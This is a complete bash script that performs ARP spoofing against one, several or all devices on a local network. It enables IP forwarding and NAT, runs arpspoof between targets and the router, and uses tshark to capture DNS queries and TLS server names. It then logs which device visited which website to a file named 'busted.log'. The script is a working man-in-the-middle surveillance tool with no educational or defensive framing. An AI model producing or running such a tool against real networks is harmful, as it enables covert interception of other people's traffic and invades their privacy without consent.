#!/bin/bash

# Automatically detect active network interface
INTERFACE=$(ip route | grep default | awk '{print $5}')
if [ -z "$INTERFACE" ]; then
    echo "[!] Error: Could not detect network interface."
    exit 1
fi

# Get Router IP Automatically
ROUTER_IP=$(ip route | grep default | awk '{print $3}')
if [ -z "$ROUTER_IP" ]; then
    echo "[!] Error: Could not detect router IP."
    exit 1
fi

LOG_FILE="busted.log"

cleanup() {
    echo -e "\n[*] Restoring network settings..."
    sudo pkill arpspoof
    sudo iptables --flush
    sudo iptables --table nat --flush
    sudo iptables --delete-chain
    sudo iptables --table nat --delete-chain
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
    echo "[*] Cleanup complete. Exiting."
    exit 0
}

trap cleanup SIGINT

echo "[*] Using detected network interface: $INTERFACE"
echo "[*] Detected router IP: $ROUTER_IP"
echo "[*] Select attack mode:"
echo "    1) Single target"
echo "    2) Multi-target"
echo "    3) All devices (excluding router)"
read -r ATTACK_MODE

TARGET_IPS=()

if [ "$ATTACK_MODE" == "1" ]; then
    echo "[*] Enter target IP (e.g., 192.168.0.6):"
    read -r SINGLE_TARGET
    TARGET_IPS+=("$SINGLE_TARGET")

elif [ "$ATTACK_MODE" == "2" ]; then
    echo "[*] Enter target IPs separated by spaces (e.g., 192.168.0.6 192.168.0.10 192.168.0.15):"
    read -r MULTI_TARGETS
    TARGET_IPS=($MULTI_TARGETS)

elif [ "$ATTACK_MODE" == "3" ]; then
    echo "[*] Scanning network for devices..."
    TARGET_IPS=($(sudo arp-scan --localnet | awk '{print $1}' | grep -E "192.168.*" | grep -v "$ROUTER_IP"))
    if [ ${#TARGET_IPS[@]} -eq 0 ]; then
        echo "[!] No devices found on the network."
        exit 1
    fi
else
    echo "[!] Invalid selection. Exiting."
    exit 1
fi

echo "[*] Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

echo "[*] Setting up NAT with iptables..."
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables --delete-chain
sudo iptables --table nat --delete-chain
sudo iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -j ACCEPT

echo "[*] Running ARP spoofing..."
for TARGET_IP in "${TARGET_IPS[@]}"; do
    sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$ROUTER_IP" > /dev/null 2>&1 &
done

sleep 3

echo "[*] Capturing visited websites (Origin IP → Website)..."
sudo tshark -i "$INTERFACE" -Y "tls.handshake.extensions_server_name or dns.qry.name" -T fields -e ip.src -e tls.handshake.extensions_server_name -e dns.qry.name | awk -v router="$ROUTER_IP" '
{
    if ($1 != router && $2) {
        print $1, "→", $2;
        fflush(stdout);
    }
}' | tee -a "$LOG_FILE"

# Cleanup on exit
